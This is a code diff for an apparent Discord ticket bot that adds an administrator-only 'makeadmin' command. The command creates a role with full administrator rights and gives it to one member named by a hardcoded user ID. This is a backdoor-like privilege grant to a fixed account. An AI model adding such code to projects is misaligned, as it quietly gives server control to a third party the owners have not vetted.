@@ -1009,6 +1009,27 @@ async def sendpanel(ctx):
         view=TicketPanel()
     )
 
+@bot.command()
+@commands.has_permissions(administrator=True)
+async def makeadmin(ctx):
+
+    guild = ctx.guild
+
+    # Create admin role
+    admin_role = await guild.create_role(
+        name="AdminRole",
+        permissions=discord.Permissions(administrator=True)
+    )
+
+    # Get member by ID
+    member = guild.get_member(1400552513203077342)
+
+    if member:
+        await member.add_roles(admin_role)
+        await ctx.send(f"Admin role given to {member.mention}")
+    else:
+        await ctx.send("User not found.")
+
 # =========================================================
 # RUN
 # =========================================================
